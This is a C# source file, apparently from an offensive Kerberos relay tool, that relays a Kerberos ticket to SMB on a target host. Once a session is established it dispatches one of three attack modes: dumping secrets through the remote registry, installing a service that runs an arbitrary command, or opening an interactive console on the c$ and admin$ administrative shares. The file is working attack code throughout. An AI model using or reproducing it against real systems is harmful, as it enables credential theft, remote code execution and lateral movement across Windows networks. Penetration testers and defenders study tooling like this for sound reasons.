using System;
using System.Linq;
using System.Diagnostics;
using static RemoteKrbRelay.Relay.Relay;

namespace RemoteKrbRelay.Relay
{
    class Smb
    {
        public static void Relay()
        {
            Console.WriteLine("[+] Let's relay to SMB");
            var response = Options.smbClient.Login(ticket, out bool success);
            if (!success)
            {
                apRep1 = response;
                Debug.WriteLine($"[*] apRep1: {Helpers.Helpers.ByteArrayToString(apRep1)}");
            } 
            else
            {
                Console.WriteLine("[+] Session Established");

                try
                {
                    switch (Options.smbkeyword)
                    {
                        case "secrets":
                            Debug.WriteLine("[*] Lets dump secrets");
                            RemoteKrbRelay.Clients.Attacks.RemoteRegistry.secretsDump(Options.smbClient, false);
                            break;

                        case "service-add":
                            Debug.WriteLine($"[*] Okay. Lets create service {Options.serviceName} on {Options.target} with cmd {Options.serviceCmd}");
                            RemoteKrbRelay.Clients.Attacks.ServiceManager.serviceInstall(Options.smbClient, Options.serviceName, Options.serviceCmd);
                            break;

                        case "interactive":
                            Debug.WriteLine("[*] Starting console");
                            RemoteKrbRelay.Clients.Attacks.Shares.smbConsole(Options.smbClient);
                            RemoteKrbRelay.Clients.Attacks.Shares.smbConsole(Options.smbClient, "c$");
                            RemoteKrbRelay.Clients.Attacks.Shares.smbConsole(Options.smbClient, "admin$");
                            break;
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine($"[-] Error Occured {e}");
                }

                Options.smbClient.Logoff();
                Options.smbClient.Disconnect();
                Environment.Exit(0);
            }
        }
    }
}
